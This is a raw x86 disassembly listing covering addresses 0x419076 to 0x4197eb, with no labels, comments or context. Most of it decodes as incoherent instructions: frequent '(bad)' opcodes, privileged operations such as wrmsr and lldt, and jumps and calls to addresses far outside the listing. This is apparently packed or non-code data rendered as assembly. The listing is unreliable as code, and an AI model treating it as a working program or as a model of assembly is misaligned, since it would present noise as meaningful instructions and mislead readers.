  419076:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  41907c:	wrmsr  
  41907e:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  419085:	dec    ebp
  419086:	ret    
  419087:	mov    edi,DWORD PTR [esi-0x4]
  41908a:	pop    eax
  41908b:	dec    ebp
  41908c:	jne    0x419019
  41908e:	xor    edi,esp
  419090:	inc    eax
  419091:	dec    ebp
  419092:	jbe    0x4190e7
  419094:	inc    eax
  419095:	pop    ebp
  419096:	add    edx,DWORD PTR [esi+0x8]
  419099:	push   ebp
  41909a:	dec    eax
  41909b:	push   ecx
  41909c:	mov    eax,edi
  41909e:	and    al,0xf0
  4190a0:	jo     0x41908d
  4190a2:	mov    eax,DWORD PTR [ebx]
  4190a4:	sbb    BYTE PTR [ebp+0x4d],cl
  4190a7:	mov    eax,DWORD PTR [ebx]
  4190a9:	nop
  4190aa:	or     BYTE PTR [eax],al
  4190ac:	jne    0x419105
  4190ae:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  4190b5:	xor    edi,edi
  4190b7:	add    edi,DWORD PTR [ebp+0x3]
  4190ba:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  4190c0:	js     0x419046
  4190c2:	jae    0x4190c6
  4190c4:	(bad)  
  4190c6:	xor    al,0x5d
  4190c8:	jmp    0x419055
  4190ca:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  4190d1:	fdecstp 
  4190d3:	test   BYTE PTR [edi],ah
  4190d5:	add    bh,BYTE PTR [ebp+0x0]
  4190d8:	add    ebx,DWORD PTR [ebp-0x77]
  4190db:	mov    edi,eax
  4190dd:	cmp    al,0x0
  4190e0:	adc    dh,BYTE PTR [ebx]
  4190e2:	jge    0x4190e7
  4190e4:	mov    edi,DWORD PTR [ebx]
  4190e6:	jl     0x4190f7
  4190e8:	clc    
  4190e9:	dec    edi
  4190ea:	jge    0x4190ec
  4190ec:	mov    eax,DWORD PTR [ebx]
  4190ee:	jb     0x4190f8
  4190f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4190f3:	mov    edi,edi
  4190f5:	xor    edx,DWORD PTR [eax]
  4190f7:	add    edi,DWORD PTR [ebx]
  4190f9:	mov    DWORD PTR [ebp-0x10],edi
  4190fc:	inc    edi
  4190fd:	pop    ebp
  4190fe:	jge    0x41913b
  419100:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  419104:	mov    edx,0xc05d87f0
  419109:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  41910d:	fimul  WORD PTR [eax]
  41910f:	fist   WORD PTR [ebp+0x1c]
  419112:	in     al,dx
  419113:	jne    0x419101
  419115:	mov    edi,DWORD PTR [edx-0x7a27a10]
  41911b:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  41911f:	fdivp  st(0),st
  419121:	fild   WORD PTR [ebp+0x4510f85c]
  419127:	test   BYTE PTR [ebx+0x4d00fc02],cl
  41912d:	inc    ebp
  41912e:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  419134:	mov    ebp,DWORD PTR [ebx-0x4]
  419137:	adc    al,0x8b
  419139:	rcl    DWORD PTR [eax],0x48
  41913c:	mov    esi,0x7080803
  419141:	fiadd  WORD PTR [ebp+0x4d]
  419144:	(bad)  
  419145:	mov    edx,DWORD PTR [edx-0x4]
  419148:	mov    edx,DWORD PTR [ebp-0x4]
  41914b:	xor    ebx,DWORD PTR [ebx+0x330103]
  419151:	mov    DWORD PTR [edi+0x872dc],edi
  419157:	xlat   BYTE PTR ds:[ebx]
  419158:	into   
  419159:	ffreep st(6)
  41915b:	retf   0x6c7
  41915e:	iret   
  41915f:	dec    ebp
  419160:	inc    ebp
  419161:	mov    DWORD PTR [ebx],edi
  419163:	fmul   QWORD PTR [edi]
  419165:	dec    ebp
  419166:	jnp    0x41919b
  419168:	add    BYTE PTR [ebx],al
  41916a:	mov    ecx,DWORD PTR [esp+edi*8]
  41916d:	inc    ebp
  41916e:	dec    ebp
  41916f:	lea    esi,[ebx]
  419171:	add    DWORD PTR [ebx],eax
  419173:	jb     0x4191b0
  419175:	add    BYTE PTR [edi],cl
  419177:	inc    ebp
  419178:	imul   eax,edi,0x858bd800
  41917e:	cld    
  41917f:	clc    
  419180:	mov    DWORD PTR [ebp+0x0],eax
  419183:	inc    DWORD PTR [eax]
  419185:	or     al,0xde
  419187:	sbb    bh,0x1
  41918a:	retf   
  41918b:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  419192:	dec    ebp
  419193:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  419199:	enter  0x12de,0xdf
  41919d:	inc    ebp
  41919e:	pop    ebp
  41919f:	dec    DWORD PTR [ebx-0x257f0ff4]
  4191a5:	add    DWORD PTR [edx],edx
  4191a7:	add    BYTE PTR [ebp+0x50],dl
  4191aa:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  4191b0:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  4191b6:	or     ah,al
  4191b8:	pop    ss
  4191b9:	cdq    
  4191ba:	push   ebp
  4191bb:	clc    
  4191bc:	mov    eax,DWORD PTR [ebp-0x4]
  4191bf:	xor    edx,edx
  4191c1:	add    esi,DWORD PTR [ebx]
  4191c3:	cmp    eax,DWORD PTR [ebx]
  4191c5:	hlt    
  4191c6:	cmp    DWORD PTR [ebx],esp
  4191c8:	or     al,BYTE PTR [ebp+0xf]
  4191cb:	mov    eax,DWORD PTR [edx]
  4191cd:	loopne 0x4191cf
  4191cf:	(bad)  
  4191d0:	mov    ecx,esi
  4191d2:	cld    
  4191d3:	pushf  
  4191d4:	pop    ebp
  4191d5:	pushf  
  4191d6:	mov    esi,DWORD PTR [edx]
  4191d8:	lock mov eax,eax
  4191db:	adc    BYTE PTR [ebx],al
  4191dd:	or     BYTE PTR [ebx+0x4d001001],0xcf
  4191e4:	xor    ebp,DWORD PTR [edi+0x50e45189]
  4191ea:	dec    ebp
  4191eb:	mov    ecx,DWORD PTR [ebx-0x31390304]
  4191f1:	(bad)  
  4191f2:	iret   
  4191f3:	inc    ebp
  4191f4:	(bad)  
  4191f5:	jne    0x419244
  4191f7:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  4191fd:	(bad)  
  4191fe:	cmp    ebx,eax
  419200:	je     0x419188
  419202:	add    edi,edi
  419204:	or     bh,bh
  419206:	dec    ebp
  419207:	inc    ebp
  419208:	mov    esi,DWORD PTR [ebx]
  41920a:	cld    
  41920b:	add    ecx,esi
  41920d:	cmp    ecx,DWORD PTR [eax-0xc]
  419210:	mov    edx,DWORD PTR [edi]
  419212:	or     BYTE PTR [ebp-0x7c],al
  419215:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  41921c:	or     al,0x9c
  41921e:	inc    ebp
  41921f:	xor    bh,BYTE PTR [ecx+ecx*4]
  419222:	pushf  
  419223:	call   0x5281b3
  419228:	jne    0x4191f1
  41922a:	mov    ebp,esp
  41922c:	fcomp  DWORD PTR [ebx]
  41922e:	add    BYTE PTR [ecx],al
  419230:	inc    DWORD PTR [ebp-0x75]
  419233:	(bad)  
  419234:	cld    
  419235:	add    al,0xce
  419237:	mov    ecx,edi
  419239:	cld    
  41923a:	inc    ebp
  41923b:	fidivr WORD PTR [ebx]
  41923d:	fbstp  TBYTE PTR [ebp-0x3e]
  419240:	mov    eax,DWORD PTR [eax]
  419242:	adc    BYTE PTR [ebx-0x3974038b],cl
  419248:	fadd   st,st(7)
  41924a:	add    BYTE PTR [ebp-0x1],al
  41924d:	mov    ecx,DWORD PTR [esp+edi*8]
  419250:	inc    ebp
  419251:	mov    bh,0xc7
  419254:	loopne 0x41929b
  419256:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  41925c:	sbb    BYTE PTR [ebx],dh
  41925e:	pushf  
  41925f:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  419265:	mov    eax,edi
  419267:	cwde   
  419268:	inc    ebp
  419269:	inc    ebp
  41926a:	jne    0x4191f7
  41926c:	mov    esp,esp
  41926e:	clc    
  41926f:	add    al,0x4d
  419271:	mov    DWORD PTR [ebx],esi
  419273:	or     al,0x33
  419275:	inc    ebp
  419276:	lea    ecx,[ebx-0x398d13fd]
  41927c:	add    bh,al
  41927e:	inc    ebp
  41927f:	ror    DWORD PTR [ebx+0x45d829],0x8b
  419286:	add    ebp,esp
  419288:	shufps xmm1,xmm3,0xc7
  41928c:	(bad)  
  41928d:	jmp    0x7486cdb6
  419292:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  419298:	hlt    
  419299:	mov    ecx,DWORD PTR [edi]
  41929b:	fadd   DWORD PTR [ebp+0x0]
  41929e:	xor    ecx,DWORD PTR [edi]
  4192a0:	add    ecx,ecx
  4192a2:	cmp    edi,edi
  4192a4:	pmuludq mm7,QWORD PTR [edx+0x50]
  4192a8:	(bad)  
  4192a9:	jmp    0x419236
  4192ab:	mov    edi,esp
  4192ad:	or     al,0xc6
  4192af:	inc    ebp
  4192b0:	(bad)  
  4192b1:	mov    eax,DWORD PTR [ebp+0x10]
  4192b4:	jne    0x41923f
  4192b6:	mov    eax,DWORD PTR [ecx]
  4192b8:	clc    
  4192b9:	add    BYTE PTR [ebp-0x40],cl
  4192bc:	xor    edx,DWORD PTR [eax-0x73]
  4192bf:	jne    0x4192c2
  4192c1:	push   DWORD PTR [edx+0x8]
  4192c4:	add    BYTE PTR [ebp+0x45],al
  4192c7:	mov    ebp,ecx
  4192c9:	cld    
  4192ca:	add    BYTE PTR [ebp+0x0],cl
  4192cd:	xor    eax,DWORD PTR [ebp+0x3]
  4192d0:	mov    DWORD PTR [ebx],edi
  4192d2:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  4192d8:	sub    eax,0x5d330e4d
  4192dd:	lea    esi,[ebx]
  4192df:	add    DWORD PTR [ebx],eax
  4192e1:	jb     0x4192cc
  4192e3:	add    BYTE PTR [eax],al
  4192e5:	inc    ebp
  4192e6:	add    bl,ch
  4192e8:	inc    ebp
  4192e9:	mov    esi,DWORD PTR [ebx]
  4192eb:	or     al,0x3
  4192ed:	(bad)  
  4192ee:	mov    edi,eax
  4192f0:	in     al,dx
  4192f1:	scas   eax,DWORD PTR es:[edi]
  4192f2:	inc    ebp
  4192f3:	mov    esi,DWORD PTR [ebx]
  4192f5:	in     al,0x3
  4192f7:	add    al,0x89
  4192f9:	mov    ecx,DWORD PTR [eax+edi*8]
  4192fc:	dec    ebp
  4192fd:	(bad)  
  4192fe:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  419305:	mov    ecx,eax
  419307:	cld    
  419308:	push   es
  419309:	dec    ebp
  41930a:	add    al,0x33
  41930c:	mov    DWORD PTR [ebx],eax
  41930e:	in     al,dx
  41930f:	cmp    DWORD PTR [ebp-0x67],eax
  419312:	mov    eax,DWORD PTR [ebp-0xba0068]
  419318:	mov    edx,DWORD PTR [ebp-0x4]
  41931b:	mov    ecx,DWORD PTR [ebp-0x18]
  41931e:	xor    ecx,DWORD PTR [ebp+0x3]
  419321:	cmp    DWORD PTR [ebx],0x8b32749b
  419327:	xor    edi,esp
  419329:	jmp    0xff75907b
  41932e:	add    ecx,DWORD PTR [ebp-0x3f]
  419331:	xor    ebx,DWORD PTR [edi]
  419333:	add    eax,ecx
  419335:	cmp    ebx,DWORD PTR [eax]
  419337:	mov    ecx,DWORD PTR [ebp-0x4]
  41933a:	mov    ecx,DWORD PTR [eax]
  41933c:	adc    BYTE PTR [ebp-0x80],al
  41933f:	jmp    0x419342
  419341:	mov    eax,DWORD PTR [eax]
  419343:	cld    
  419344:	mov    bh,0xc6
  419346:	push   ecx
  419347:	(bad)  
  419348:	jne    0x4193a8
  41934a:	dec    ecx
  41934c:	or     BYTE PTR [ecx+ebx*1],cl
  41934f:	push   ebp
  419350:	inc    ebp
  419351:	in     al,dx
  419352:	add    ebp,esp
  419354:	or     bh,al
  419356:	dec    ebp
  419357:	cld    
  419358:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  41935e:	xor    DWORD PTR [eax],0x2
  419361:	pushf  
  419362:	dec    DWORD PTR [ebx+0x45510cf4]
  419368:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  41936e:	mov    edx,DWORD PTR [ecx+0xc]
  419371:	xor    eax,esi
  419373:	mov    edx,0xc172c7
  419378:	inc    ebp
  419379:	mov    esi,DWORD PTR [ebp+0x8]
  41937c:	mov    eax,edx
  41937e:	call   0x84c65a73
  419383:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  41938a:	call   0x4db1a397
  41938f:	push   edi
  419390:	xor    esi,DWORD PTR [ebp+0x3]
  419393:	(bad)  
  419394:	pmulhuw mm0,mm1
  419397:	test   DWORD PTR [ebp-0x8],ecx
  41939a:	mov    DWORD PTR [ebp-0x67],eax
  41939d:	mov    eax,DWORD PTR [ebp-0x4]
  4193a0:	xor    edi,DWORD PTR [ebp-0x73]
  4193a3:	xor    eax,DWORD PTR [ebx]
  4193a5:	xor    esi,DWORD PTR [edx+0x3]
  4193a8:	add    BYTE PTR [ecx],bh
  4193aa:	inc    ebp
  4193ab:	(bad)  
  4193ac:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  4193b2:	mov    DWORD PTR [eax],0x750f0004
  4193b8:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  4193be:	lock add BYTE PTR [ebp+0x0],al
  4193c2:	mov    esi,DWORD PTR [ebp-0x2c]
  4193c5:	mov    ebp,edx
  4193c7:	or     al,0x72
  4193c9:	ja     0x4193cb
  4193cb:	mov    edx,esi
  4193cd:	cld    
  4193ce:	(bad)  
  4193d1:	cli    
  4193d2:	mov    esi,DWORD PTR [ebp-0x4]
  4193d5:	cmp    ecx,esi
  4193d7:	bswap  edi
  4193d9:	(bad)
  4193dd:	mov    esi,DWORD PTR [ebp-0x4]
  4193e0:	mov    esi,ecx
  4193e2:	clc    
  4193e3:	repnz add esi,DWORD PTR [ebp+0x45]
  4193e7:	push   ebx
  4193e8:	xor    eax,DWORD PTR [ebp+0x3]
  4193eb:	xor    bl,BYTE PTR [edi-0x64]
  4193ee:	pop    ebx
  4193ef:	jmp    0x4194b6
  4193f4:	mov    esi,DWORD PTR [ebp-0x7d]
  4193f7:	xor    ebp,DWORD PTR [eax]
  4193f9:	lea    eax,[ebp-0x8]
  4193fc:	xor    edx,esi
  4193fe:	pushf  
  4193ff:	out    dx,eax
  419400:	(bad)  
  419401:	neg    eax
  419403:	ins    DWORD PTR es:[edi],dx
  419404:	test   esi,edi
  419406:	clc    
  419407:	pop    esp
  419408:	inc    ebp
  419409:	or     BYTE PTR [ecx+0x450f0c7d],cl
  41940f:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  419415:	add    cl,al
  419417:	jne    0x4193b5
  419419:	mov    esi,DWORD PTR [edx]
  41941b:	in     al,dx
  41941c:	push   esi
  41941d:	xor    BYTE PTR [ebp-0xe],dh
  419420:	add    edi,esi
  419422:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  419428:	add    cl,bh
  41942a:	mov    edi,DWORD PTR [ebp+0x8]
  41942d:	mov    DWORD PTR [ebp-0x14],esi
  419430:	add    esi,DWORD PTR [ebp+0x3c]
  419433:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  419439:	mov    ah,0x3c
  41943b:	pushf  
  41943c:	pushf  
  41943d:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  419443:	jne    0x4193d0
  419445:	mov    ecx,DWORD PTR [esp+ebp*8]
  419448:	icebp  
  419449:	icebp  
  41944a:	shl    edx,0xf2
  41944d:	(bad)  
  41944e:	mov    ah,0x16
  419450:	pop    eax
  419451:	jne    0x4193e6
  419453:	mov    ecx,DWORD PTR [edi]
  419455:	in     al,dx
  419456:	jmp    0x419449
  419458:	add    dl,dh
  41945a:	mov    edi,esi
  41945c:	or     al,0x8
  41945e:	inc    ebp
  41945f:	jne    0x419464
  419461:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  419467:	ret    
  419468:	or     bh,bh
  41946a:	jge    0x419454
  41946c:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  419472:	xor    edi,eax
  419474:	add    esi,DWORD PTR [ebp-0x77]
  419477:	mov    ebx,esp
  419479:	clc    
  41947a:	neg    DWORD PTR [ebp-0x7c]
  41947d:	xor    eax,DWORD PTR [eax]
  41947f:	cmp    eax,DWORD PTR [eax]
  419481:	repz jne 0x419419
  419484:	xor    eax,DWORD PTR [ecx]
  419486:	add    ebx,DWORD PTR [eax]
  419488:	mov    DWORD PTR [ebp-0x8],eax
  41948b:	mov    eax,edi
  41948d:	cld    
  41948e:	lock pop eax
  419490:	test   DWORD PTR [ebx],esi
  419492:	clc    
  419493:	add    edx,DWORD PTR [edi-0x740bff77]
  419499:	fdivp  st(4),st
  41949b:	test   ecx,esi
  41949d:	(bad)  
  41949e:	jnp    0x41949f
  4194a0:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  4194a6:	jae    0x419433
  4194a8:	sub    edi,esp
  4194aa:	(bad)  
  4194ab:	shl    DWORD PTR [eax-0x3e],0x89
  4194af:	leave  
  4194b0:	call   0x81974bbd
  4194b5:	in     al,dx
  4194b6:	(bad)  
  4194b7:	in     al,dx
  4194b8:	add    bh,al
  4194ba:	mov    esp,edi
  4194bc:	in     al,dx
  4194bd:	test   DWORD PTR [ebp-0x8],edi
  4194c0:	mov    eax,DWORD PTR [ebp+0x2b]
  4194c3:	xor    BYTE PTR [ebx],al
  4194c5:	pushf  
  4194c6:	jnp    0x573090ff
  4194cc:	xor    edx,DWORD PTR [ebp-0x77]
  4194cf:	push   ecx
  4194d0:	loopne 0x419505
  4194d2:	jne    0x41948f
  4194d4:	mov    esi,DWORD PTR [edx-0x20]
  4194d7:	add    BYTE PTR [ebp-0x3d],bh
  4194da:	xor    eax,DWORD PTR [ebp-0x73]
  4194dd:	mov    edi,DWORD PTR [esi]
  4194df:	cld    
  4194e0:	jb     0x4194a8
  4194e2:	add    bl,al
  4194e4:	jne    0x41952b
  4194e6:	mov    edx,DWORD PTR [edi-0x10]
  4194e9:	jge    0x419568
  4194eb:	mov    esi,DWORD PTR [ebx]
  4194ed:	lock add ecx,DWORD PTR [ebp+0x3b]
  4194f1:	xor    esi,DWORD PTR [ebp-0x77]
  4194f4:	mov    esi,eax
  4194f6:	lock inc ebp
  4194f8:	jge    0x41952b
  4194fa:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  419501:	dec    ebp
  419502:	mov    esi,DWORD PTR [ebx]
  419504:	loopne 0x41948f
  419506:	jge    0x419500
  419508:	add    DWORD PTR [ebp-0x7d],eax
  41950b:	icebp  
  41950c:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  419513:	dec    ebp
  419514:	hlt    
  419515:	xor    ebx,DWORD PTR [ebp-0x77]
  419518:	mov    esi,esp
  41951a:	in     al,0x45
  41951c:	jge    0x41955b
  41951e:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  419525:	dec    ebp
  419526:	pop    esp
  419527:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  41952d:	inc    ebp
  41952e:	hlt    
  41952f:	xor    DWORD PTR [ebp-0x61],esi
  419532:	mov    edi,DWORD PTR [eax+0xf19504]
  419538:	repnz mov DWORD PTR [ebp+0x20],ebx
  41953c:	cmp    eax,DWORD PTR [ebp+0xf]
  41953f:	test   DWORD PTR [edi+ecx*1-0x1],edx
  419543:	fistp  WORD PTR [ebx+0x0]
  419546:	inc    ebp
  419547:	mov    ebx,DWORD PTR [edi+0xc]
  41954a:	add    eax,eax
  41954c:	inc    ebp
  41954d:	test   BYTE PTR [ebx],dh
  41954f:	add    eax,DWORD PTR [ebx]
  419551:	add    BYTE PTR [esi+0x45],bl
  419554:	ret    0x85
  419557:	jnp    0x54421926
  41955d:	inc    bp
  41955f:	inc    ebp
  419560:	xor    DWORD PTR [ecx+0xc78a9c],edi
  419566:	fdiv   QWORD PTR [ebx]
  419568:	test   DWORD PTR [ecx+0x453bf8],edi
  41956e:	push   ebx
  41956f:	add    edi,DWORD PTR [esi+0x708088b]
  419575:	cmp    esi,eax
  419577:	setl   BYTE PTR [ecx-0x74fcffce]
  41957e:	mov    esp,edi
  419580:	call   0x33ccdad2
  419585:	or     BYTE PTR [ebx],al
  419587:	inc    ecx
  419588:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  41958e:	and    BYTE PTR [ebp-0x7074f0bb],al
  419594:	lock add cl,al
  419597:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  41959e:	mov    ch,0x45
  4195a0:	clc    
  4195a1:	xor    eax,DWORD PTR [ebp+0x3]
  4195a4:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4195aa:	inc    ebp
  4195ab:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4195b1:	mov    edi,eax
  4195b3:	mov    eax,DWORD PTR [ebp+0x3c]
  4195b6:	mov    ecx,DWORD PTR [eax]
  4195b8:	hlt    
  4195b9:	inc    ebp
  4195ba:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4195c1:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4195c7:	push   ebp
  4195c8:	mov    edi,DWORD PTR [ebx]
  4195ca:	in     al,dx
  4195cb:	jne    0x41958e
  4195cd:	mov    eax,DWORD PTR [ebp-0x28]
  4195d0:	add    DWORD PTR [eax],0xe8058dec
  4195d6:	clc    
  4195d7:	mov    esi,DWORD PTR [edi-0x8]
  4195da:	add    dh,dl
  4195dc:	rol    WORD PTR [ebp-0x1],cl
  4195e0:	mov    edx,DWORD PTR [eax+0x8]
  4195e3:	jne    0x4195a5
  4195e5:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4195ec:	inc    ebp
  4195ed:	push   esp
  4195ee:	test   DWORD PTR [ecx+0xf],ecx
  4195f1:	sub    edx,esp
  4195f3:	add    eax,DWORD PTR [eax]
  4195f5:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4195fb:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  419602:	mov    eax,DWORD PTR [ecx]
  419604:	and    BYTE PTR [eax],al
  419606:	adc    BYTE PTR ds:[eax],al
  419609:	inc    ebp
  41960a:	inc    cx
  41960d:	push   esp
  41960e:	add    al,0x75
  419610:	add    BYTE PTR [edx+0x66],dl
  419613:	enter  0xc1,0x4d
  419617:	mov    esp,DWORD PTR [esi+0x20]
  41961a:	add    DWORD PTR [ecx-0x7b],eax
  41961d:	add    eax,DWORD PTR [ebx]
  41961f:	str    WORD PTR [eax+0x45]
  419623:	lea    ecx,[ebx+0x45890801]
  419629:	sbb    BYTE PTR [ebx],al
  41962b:	dec    ebp
  41962c:	cmp    al,0xf
  41962e:	inc    ebp
  41962f:	push   eax
  419630:	mov    esi,DWORD PTR [ebx]
  419632:	push   eax
  419633:	add    eax,eax
  419635:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  41963c:	inc    ebp
  41963d:	add    BYTE PTR [ecx],dh
  41963f:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  419646:	(bad)  
  419647:	mov    ebx,eax
  419649:	loopne 0x419690
  41964b:	dec    ebp
  41964c:	mov    ecx,DWORD PTR [edi]
  41964e:	cld    
  41964f:	push   eax
  419650:	xchg   DWORD PTR [ebx],esi
  419652:	add    DWORD PTR [ebx],ebp
  419654:	add    BYTE PTR [ebx],ch
  419656:	or     BYTE PTR [ecx],bh
  419658:	dec    ecx
  419659:	loopne 0x41965e
  41965b:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  419661:	push   ebp
  419662:	add    DWORD PTR [ebx+0x55100800],eax
  419668:	dec    ebp
  419669:	jmp    0x4195f4
  41966b:	mov    esp,DWORD PTR [eax]
  41966d:	sbb    dl,dl
  41966f:	inc    eax
  419670:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  419676:	add    BYTE PTR [ebx+0x74528555],cl
  41967c:	push   ebp
  41967d:	div    DWORD PTR [ebx]
  41967f:	and    eax,DWORD PTR [ebx]
  419681:	add    edx,DWORD PTR [edx-0x30]
  419684:	jno    0x419611
  419686:	inc    DWORD PTR [eax+eiz*1]
  419689:	inc    ebp
  41968a:	push   eax
  41968b:	push   eax
  41968c:	mov    esp,DWORD PTR [edi-0x74beff1c]
  419692:	mov    edi,esp
  419694:	push   eax
  419695:	inc    ebp
  419696:	enter  0x458b,0x8
  41969a:	push   ecx
  41969b:	(bad)  
  41969c:	call   0x10ba074
  4196a1:	pop    ss
  4196a2:	push   ebp
  4196a3:	mov    ecx,DWORD PTR [ebx+0x489408]
  4196a9:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4196af:	push   ecx
  4196b0:	jo     0x41969a
  4196b2:	inc    DWORD PTR [edi]
  4196b4:	or     BYTE PTR [eax],al
  4196b6:	call   0xcc9e00
  4196bb:	fmul   QWORD PTR [ebp+0x55]
  4196be:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4196c4:	mov    bh,0x8c
  4196c6:	adc    al,0x9c
  4196c8:	dec    esp
  4196c9:	xor    bl,BYTE PTR [eax]
  4196cb:	mov    ecx,DWORD PTR [ebp+0xc]
  4196ce:	mov    eax,DWORD PTR [ebp-0x4]
  4196d1:	mov    esi,DWORD PTR [edi-0x3148f924]
  4196d7:	push   es
  4196d8:	retf   
  4196d9:	mov    BYTE PTR [ebp-0x30],0x3b
  4196dd:	inc    ebp
  4196de:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4196e5:	retf   0x83fc
  4196e8:	into   
  4196e9:	dec    ebp
  4196ea:	retf   
  4196eb:	mov    ecx,DWORD PTR [ebp-0x74]
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	fdiv   QWORD PTR [ebx]
  4196f2:	mov    bh,0x3
  4196f4:	push   es
  4196f5:	mov    esi,ecx
  4196f7:	sbb    cl,dl
  4196f9:	dec    ebp
  4196fa:	sar    DWORD PTR [ebx],cl
  4196fc:	push   ebp
  4196fd:	jne    0x41970e
  4196ff:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  419705:	lea    ebx,[eax]
  419707:	call   0xf4cb22ce
  41970c:	sbb    dh,dl
  41970e:	add    edx,ebx
  419710:	push   ebp
  419711:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  419717:	push   ecx
  419718:	mov    DWORD PTR [eax-0x30],edx
  41971b:	test   DWORD PTR [edx],eax
  41971d:	xadd   esp,esi
  419720:	pop    es
  419721:	add    cl,dl
  419723:	mov    eax,ecx
  419725:	or     al,0x45
  419727:	(bad)  
  419728:	push   eax
  419729:	add    DWORD PTR [edx+0x0],eax
  41972c:	add    ecx,DWORD PTR [ecx]
  41972e:	and    dh,cl
  419730:	call   0xc5a000
  419735:	add    DWORD PTR [ebp+0x0],edx
  419738:	mov    esp,DWORD PTR [ebp+0x18]
  41973b:	add    BYTE PTR [eax+0x54],cl
  41973e:	xor    eax,DWORD PTR [eax]
  419740:	add    esp,DWORD PTR [esi+0x3b]
  419743:	inc    ebp
  419744:	je     0x4196c9
  419746:	push   ecx
  419747:	cli    
  419748:	dec    ebp
  419749:	mov    DWORD PTR [ebx],eax
  41974b:	(bad)  
  41974c:	or     al,0x5e
  41974e:	inc    eax
  41974f:	add    BYTE PTR [ebx],al
  419751:	data16 and BYTE PTR [ebp+0x50],al
  419755:	sub    DWORD PTR [ecx],0xfffffff8
  419758:	add    BYTE PTR [ebp-0x75],ah
  41975b:	add    BYTE PTR [eax],bl
  41975d:	enter  0x894d,0x8b
  419761:	int3   
  419762:	loopne 0x419726
  419764:	rol    BYTE PTR [eax],0x33
  419767:	lea    cx,[ebp+0xa]
  41976b:	data16 jb 0x4197b3
  41976e:	add    BYTE PTR [ebx+0x44890855],cl
  419774:	sbb    ah,al
  419776:	inc    ebp
  419777:	lldt   WORD PTR ds:[edx+0x66]
  41977c:	xor    ecx,DWORD PTR [eax]
  41977e:	sub    eax,DWORD PTR [ebx+ecx*4]
  419781:	add    BYTE PTR [esi+eiz*2],cl
  419784:	ror    edx,cl
  419786:	dec    ebp
  419787:	inc    ebp
  419788:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  41978e:	cld    
  41978f:	or     BYTE PTR [edi+0x4501dd],dl
  419795:	(bad)  
  419796:	into   
  419797:	out    dx,al
  419798:	retf   
  419799:	(bad)  
  41979a:	dec    ebp
  41979b:	mov    al,0x8b
  41979d:	loop   0x4197bf
  41979f:	cmp    ecx,DWORD PTR [edx]
  4197a1:	inc    ebp
  4197a2:	daa    
  4197a3:	loop   0x41972c
  4197a5:	out    dx,al
  4197a6:	add    edi,eax
  4197a8:	add    BYTE PTR [eax+0x3f52e155],bh
  4197ae:	push   ebp
  4197af:	inc    ebp
  4197b0:	xor    ebx,esp
  4197b2:	add    ebp,esi
  4197b4:	push   edx
  4197b5:	push   bp
  4197b7:	inc    ebp
  4197b8:	(bad)  
  4197b9:	in     eax,dx
  4197ba:	push   esp
  4197bb:	(bad)  
  4197bc:	inc    edx
  4197be:	sbb    al,0x33
  4197c0:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4197c7:	add    BYTE PTR [ebp+0x47],0x8b
  4197cb:	jmp    0xf98b:0x100041c8
  4197d2:	xor    esi,DWORD PTR [edx+0x3]
  4197d5:	mov    ecx,DWORD PTR [edi]
  4197d7:	fmul   DWORD PTR [edx]
  4197d9:	add    BYTE PTR [eax],al
  4197db:	lea    eax,[ebx-0x4700273c]
  4197e1:	add    al,0x4f
  4197e3:	pop    DWORD PTR [eax]
  4197e5:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4197eb:	push   edx
